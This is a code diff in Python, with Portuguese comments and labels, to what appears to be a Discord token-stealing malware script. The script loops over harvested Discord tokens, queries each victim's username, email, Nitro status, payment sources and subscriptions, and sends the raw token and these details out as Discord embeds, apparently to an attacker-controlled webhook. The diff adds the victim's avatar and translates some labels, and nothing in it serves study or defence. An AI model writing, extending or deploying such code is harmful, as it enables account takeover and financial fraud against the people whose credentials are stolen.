@@ -75,23 +75,31 @@ if __name__ == "__main__":
         }
         enviar_para_discord('', embed=os_embed)
 
+        from datetime import datetime
+
         for token in discord_info.tokens:
             user_data = discord_info.get_user_data(token)
             if user_data:
+                # Montar a URL da foto de perfil
+                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
+                
                 discord_embed = {
                     'title': 'Informações do Discord',
                     'description': f"Nome de usuário: {user_data['username']}\n"
-                                   f"E-mail: {user_data.get('email', 'Não disponível')}\n"
-                                   f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
-                                   f"Token: `{token}`",
-                    'color': 0xFF0000  
+                                f"E-mail: {user_data.get('email', 'Não disponível')}\n"
+                                f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
+                                f"Token: `{token}`",
+                    'color': 0xFF0000,  
+                    'thumbnail': {
+                        'url': avatar_url  # Adiciona a URL da foto de perfil como thumbnail
+                    }
                 }
 
                 payment_sources = discord_info.get_payment_sources(token)
                 if payment_sources:
-                    discord_embed['description'] += f"\nCredit Card: {len(payment_sources)}"
+                    discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
                 else:
-                    discord_embed['description'] += "\nCredit Card : Nenhum"
+                    discord_embed['description'] += "\nNenhum cartão de crédito registrado"
 
                 subscriptions = discord_info.get_nitro_subscription(token)
                 if subscriptions:
@@ -104,6 +112,7 @@ if __name__ == "__main__":
                             discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"
 
                 enviar_para_discord('', embed=discord_embed)
+
 
     except Exception as e:
         print(f"Erro geral: {e}")
